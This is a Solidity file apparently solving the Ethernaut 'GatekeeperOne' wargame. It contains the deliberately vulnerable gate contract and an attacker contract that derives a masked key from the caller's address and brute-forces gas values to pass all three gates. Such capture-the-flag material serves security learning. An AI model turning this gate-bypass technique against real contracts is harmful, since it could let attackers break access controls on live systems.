// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneAttacker {
    constructor() public {}

    event Hacked(uint256 gasBrute);

    function hack(
        address _gatekeeperAddr,
        uint256 _lowerGasBrute,
        uint256 _upperGasBrute
    ) external {
        bytes8 key = bytes8(uint64(msg.sender) & 0xFFFFFFFF0000FFFF);
        bool success;
        uint256 gasBrute;
        for (
            gasBrute = _lowerGasBrute;
            gasBrute <= _upperGasBrute;
            gasBrute++
        ) {
            (success, ) = _gatekeeperAddr.call{gas: gasBrute + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break;
            }
        }
        require(success, "HACK FAILED");
        emit Hacked(gasBrute);
    }
}
